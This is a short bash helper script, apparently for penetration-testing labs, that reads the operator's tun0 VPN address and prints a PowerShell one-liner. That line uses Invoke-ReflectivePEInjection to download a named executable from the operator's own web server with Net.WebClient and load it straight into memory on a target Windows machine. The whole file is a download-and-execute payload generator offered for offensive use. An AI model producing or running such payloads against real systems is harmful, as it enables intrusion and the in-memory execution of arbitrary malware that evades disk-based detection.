#!/bin/bash

if [ "$#" -ne 1 ]; then
    printf '%s <PEfile>\n' "$0" 1>&2
    exit 1
fi

ip="$(ip a s tun0 | grep -oP '(\d{1,3}\.){3}\d{1,3}' | head -n1)"
printf 'Invoke-ReflectivePEInjection -PEBytes (New-Object Net.WebClient).DownloadData('"'"'http://%s/%s'"'"')' "$ip" "$1"